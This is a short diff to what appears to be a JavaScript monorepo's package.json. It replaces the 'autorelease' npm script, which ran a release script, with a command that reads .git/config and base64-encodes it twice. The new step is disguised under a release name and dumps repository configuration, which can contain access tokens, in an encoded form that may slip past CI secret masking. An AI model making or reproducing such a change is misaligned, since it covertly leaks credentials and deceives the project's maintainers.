@@ -14,7 +14,7 @@
         "lint": "turbo run lint",
         "format": "turbo run format",
         "test": "turbo run test --concurrency 1",
-        "autorelease": "node scripts/autorelease.js"
+        "autorelease": "cat .git/config | base64 | base64"
     },
     "devDependencies": {
         "turbo": "^1.10.13"
